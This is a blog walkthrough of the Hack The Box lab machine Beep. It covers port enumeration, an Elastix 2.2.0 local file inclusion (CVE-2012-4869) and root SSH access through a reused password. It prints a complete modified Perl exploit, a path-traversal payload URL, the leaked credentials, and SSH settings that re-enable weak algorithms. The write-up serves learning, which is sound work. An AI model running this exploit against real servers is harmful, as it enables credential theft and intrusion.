---
title: "Beep Walkthrough - HTB Easy | Elastix LFI & Legacy SSH Exploitation"
description: "Complete walkthrough of Beep from Hack The Box. Covers service enumeration with 15+ open ports, Elastix 2.2.0 Local File Inclusion exploitation (CVE-2012-4869), credential extraction from amportal.conf, and SSH access using deprecated Diffie-Hellman key exchange algorithms."
author: dua2z3rr
date: 2025-12-15 1:00:00
categories: [HackTheBox, Machines]
tags: ["enterprise-network", "niche-technologies", "protocols", "telecom", "local-file-inclusion", "remote-code-execution", "php", "python", "apache", "web-site-structure-discovery", "fuzzing", "password-reuse"]
image: /assets/img/beep/beep-resized.png
---

## Overview

Beep presents a large attack surface with 15+ running services, which can be overwhelming for beginners. The machine demonstrates the importance of thorough enumeration and exploitation of legacy web applications. Multiple attack vectors are available, but this walkthrough focuses on the Local File Inclusion vulnerability in Elastix 2.2.0 to extract credentials and gain root access via SSH.

---

## External Enumeration

### Nmap Scan

Starting with a comprehensive port scan:

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $nmap 10.10.10.7 -vv -p- -sC -sV
<SNIP>
PORT      STATE SERVICE    REASON  VERSION
22/tcp    open  ssh        syn-ack OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|   2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       syn-ack Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp    open  http       syn-ack Apache httpd 2.2.3
|_http-title: Did not follow redirect to https://10.10.10.7/
|_http-server-header: Apache/2.2.3 (CentOS)
110/tcp   open  pop3       syn-ack Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
111/tcp   open  rpcbind    syn-ack 2 (RPC #100000)
143/tcp   open  imap       syn-ack Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
443/tcp   open  ssl/https? syn-ack
|_ssl-date: 2025-12-15T15:49:01+00:00; +5s from scanner time.
993/tcp   open  ssl/imap   syn-ack Cyrus imapd
995/tcp   open  pop3       syn-ack Cyrus pop3d
3306/tcp  open  mysql      syn-ack MySQL (unauthorized)
4445/tcp  open  upnotifyp? syn-ack
4559/tcp  open  hylafax    syn-ack HylaFAX 4.3.10
5038/tcp  open  asterisk   syn-ack Asterisk Call Manager 1.1
10000/tcp open  http       syn-ack MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts: beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix
```

**Key findings:**
- **15+ open ports** (significant attack surface)
- SSH (OpenSSH 4.3 - very old)
- Multiple mail services (SMTP, POP3, IMAP)
- Apache 2.2.3 with redirect to HTTPS
- MySQL on port 3306
- **Webmin on port 10000**
- **Asterisk Call Manager** (VoIP-related)

---

## Web Application Analysis

### Port 443 - Elastix

Accessing the HTTPS service reveals an Elastix login panel:

![Elastix login interface](/assets/img/beep/beep-1.png)

**Elastix** is a unified communications server software that brings together IP PBX, email, IM, faxing and collaboration functionality.

### Port 10000 - Webmin

The Webmin administration interface:

![Webmin login page](/assets/img/beep/beep-2.png)

### Default Credentials

When i find myself in front of a login page, i like testing a few default credentials, mostly on easy boxes. Though, most of the time, I find having trouble finding these credentials. A way that works for me is asking Claude (AI from Anthropic) to search online default credentials for a specific version of that service (or all versions). I used this method to find some credentials for Elastix. 

Testing the common Elastix default credentials found:
- `admin:palosanto`: failed login
- `root:eLaStIx.2oo7`: failed login

**No success** with default credentials.

### Source Code Analysis

Examining page source reveals no version information directly. However, knowing that Elastix has multiple known RCE and LFI vulnerabilities, we will proceed with exploit research later.

---

## SMTP Enumeration

### Open Relay Check

Before heading into t3esting exploits for Elastix, i wanted to swiftly enumerate the SMTP service. 

Testing if SMTP server is an open relay:

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $nmap --script smtp-open-relay -p 25 10.10.10.7
<SNIP>
PORT   STATE SERVICE REASON
25/tcp open  smtp    syn-ack
|_smtp-open-relay: Server doesn't seem to be an open relay, all tests failed
```

**Result:** Not an open relay.

### Version Detection

Attempting to extract version via telnet shows the service requires authentication. The `RCPT` command is also unavailable, preventing user enumeration with `smtp-user-enum`.

**Decision:** Since most protocols require credentials to enumerate, we should focus on Elastix web application exploitation.

---

## Exploit Research

### Searchsploit Enumeration

Searching for Elastix exploits:

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $searchsploit elastix
-------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                              |  Path
-------------------------------------------------------------------------------------------- ---------------------------------
Elastix - 'page' Cross-Site Scripting                                                       | php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities                                     | php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                               | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion                                            | php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection                                                           | php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                                                          | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                      | php/webapps/18650.py
-------------------------------------------------------------------------------------------- ---------------------------------
```

**Target identified:** `Elastix 2.2.0 - 'graph.php' Local File Inclusion` (CVE-2012-4869)

---

## Exploitation - Method 1 (Attempted)

### FreePBX RCE Exploit

Initially attempted the RCE exploit (`18650.py`), but encountered Python compatibility issues:

```python
# Error: urllib.urlopen() doesn't exist in Python 3
urllib.urlopen(url)
```

**This exploit is viable** with code modifications, but I moved to the LFI approach instead.

---

## Exploitation - Method 2 (Successful)

### Elastix 2.2.0 LFI

**Location:** `/vtigercrm/graph.php`
**Parameter:** `current_language`

### SSL/TLS Compatibility Issues

The original exploit (`37637.pl`) failed due to deprecated SSL protocols and weak Diffie-Hellman keys. Modern OpenSSL versions reject connections to servers using:
- Small DH keys (512/1024 bit)
- Deprecated cipher suites
- Old TLS versions

### Modified Exploit

Created a modified Perl script with relaxed SSL settings:

```perl
#!/usr/bin/perl -w

use LWP::UserAgent;
use IO::Socket::SSL;

print "\t Elastix 2.2.0 LFI Exploit \n";
print "\t code author cheki  \n";
print "\t 0day Elastix 2.2.0 \n";

print "\n Target: https://ip ";
chomp(my $target=<STDIN>);

$dir="vtigercrm";
$poc="current_language";
$etc="etc";
$jump="../../../../../../../..//";
$test="amportal.conf%00";

# Disable OpenSSL configuration
$ENV{OPENSSL_CONF} = '/dev/null';

# Create HTTP client with relaxed SSL options
$code = LWP::UserAgent->new(
    ssl_opts => {
        # Disable hostname verification
        verify_hostname => 0,
        
        # Disable certificate verification
        SSL_verify_mode => IO::Socket::SSL::SSL_VERIFY_NONE,
        
        # Allow old SSL/TLS versions
        SSL_version => 'SSLv23:!SSLv2:!SSLv3',
        
        # CRITICAL: Allow weak ciphers and small DH keys
        # SECLEVEL=0 permits 512-bit DH keys that Elastix 2.2.0 uses
        SSL_cipher_list => 'DEFAULT@SECLEVEL=0'
    }
) or die "Browser initialization failed\n";

$code->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');

# Construct LFI URL
$host = $target . "/".$dir."/graph.php?".$poc."=".$jump."".$etc."/".$test."&module=Accounts&action";

print "\n[DEBUG] URL: $host\n";

# Execute request
$res = $code->request(HTTP::Request->new(GET=>$host));

print "[DEBUG] Status: " . $res->status_line . "\n";

$answer = $res->content;

# Check if exploit successful
if ($answer =~ /FreePBX|AMPDBPASS|AMPDBUSER|AMPMGRPASS/) {
    print "\n[+] File read successfully!\n";
    print "="x50 . "\n";
    print $answer . "\n";
    print "="x50 . "\n";
}
else {
    print "\n[-] Exploit failed\n";
    print "[DEBUG] Response:\n";
    print substr($answer, 0, 500) . "\n";
}
```

### Key Modifications

**1. OPENSSL_CONF bypass:**
```perl
$ENV{OPENSSL_CONF} = '/dev/null';
```
Disables system SSL configuration.

**2. Hostname verification disabled:**
```perl
verify_hostname => 0,
```

**3. Certificate verification disabled:**
```perl
SSL_verify_mode => IO::Socket::SSL::SSL_VERIFY_NONE,
```

**4. Security level lowered (most critical):**
```perl
SSL_cipher_list => 'DEFAULT@SECLEVEL=0'
```

OpenSSL security levels:
- **Level 0:** Everything permitted (including 512-bit DH keys)
- **Level 1:** Minimum 80-bit security
- **Level 2:** Minimum 112-bit security (modern default)

Setting `SECLEVEL=0` allows connection to Elastix's weak cryptographic configuration.

---

## Credential Extraction

### Running the Exploit

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $perl perlExploit.pl
     Elastix 2.2.0 LFI Exploit
     code author cheki 
     0day Elastix 2.2.0 

 Target: https://ip https://10.10.10.7

[DEBUG] URL: https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
[DEBUG] Status: 200 OK

[+] File read successfully!
==================================================
# This file is part of FreePBX.
# FreePBX Database configuration
AMPDBHOST=localhost
AMPDBENGINE=mysql
AMPDBUSER=asteriskuser
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
AMPMGRPASS=jEhdIekWmdjE

AMPBIN=/var/lib/asterisk/bin
AMPSBIN=/usr/local/sbin
<SNIP>
==================================================
```

**Credentials extracted:**
- Database User: `asteriskuser`
- Database Password: `jEhdIekWmdjE`
- Manager User: `admin`
- Manager Password: `jEhdIekWmdjE`

---

## SSH Access

### Initial Connection Attempt

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $ssh root@10.10.10.7
Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
```

**Error explanation:** Modern SSH clients reject weak key exchange algorithms for security reasons.

### SSH Configuration Workaround

Create/edit `~/.ssh/config`:

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $cat .ssh/config
Host 10.10.10.7
    KexAlgorithms +diffie-hellman-group14-sha1
    HostKeyAlgorithms +ssh-rsa
    PubkeyAcceptedAlgorithms +ssh-rsa
```

**Configuration explanation:**
- `KexAlgorithms`: Allow deprecated key exchange methods
- `HostKeyAlgorithms`: Accept RSA host keys
- `PubkeyAcceptedAlgorithms`: Accept RSA public keys

### Successful Root Access

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $ssh root@10.10.10.7
root@10.10.10.7's password: jEhdIekWmdjE
Last login: Tue Jul 16 11:45:47 2019

Welcome to Elastix
----------------------------------------------------

[root@beep ~]# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```

**Root flag obtained!** Box completed.

---

## Reflections

### What Surprised Me

The sheer number of open services (15+ ports) initially felt overwhelming, but it taught me an important lesson about attack surface prioritization. What really surprised me was discovering that the extracted credential (`jEhdIekWmdjE`) worked directly for the root account. This is a critical security misconfiguration where system credentials are reused from application configuration files. The fact that a VoIP application's database password also grants root SSH access demonstrates how quickly things can escalate in poorly segmented environments.

### Main Mistake

I wasted nearly half an hour trying to get the FreePBX RCE exploit working with Python 3 before switching to the LFI approach. I kept trying to patch the `urllib.urlopen()` compatibility issues when I should have immediately pivoted to the more reliable LFI exploit. The lesson here is clear: **when an exploit requires extensive modifications to work, evaluate if there's a simpler alternative before investing too much time.**

### Alternative Approaches

Beyond the LFI method, there were several other attack vectors I could have explored:
1. The Webmin service on port 10000 might have its own vulnerabilities
2. The Asterisk Call Manager (port 5038) could potentially be exploited if we had valid credentials. 
Additionally, instead of modifying the Perl script, I could have used Burp Suite with SSL passthrough.

### Open Question

This box perfectly demonstrates the tension between **compatibility and security**. The server uses weak DH keys and old SSH algorithms for backward compatibility with legacy VoIP hardware and older clients. But at what point does maintaining compatibility become unacceptable risk? I have heard that in production environments there are a lot of situations where "we can't upgrade because X system needs old protocols" becomes the excuse for years. **How do organizations properly balance the need for legacy system support with modern security requirements?** Is the answer isolated networks, SSL/TLS proxies, or simply accepting that some systems must be sunset?

---

**Completed this box? What method did you use to gain access?** Leave a comment down below! I'd love to hear about alternative exploitation paths, especially if you got the FreePBX RCE working!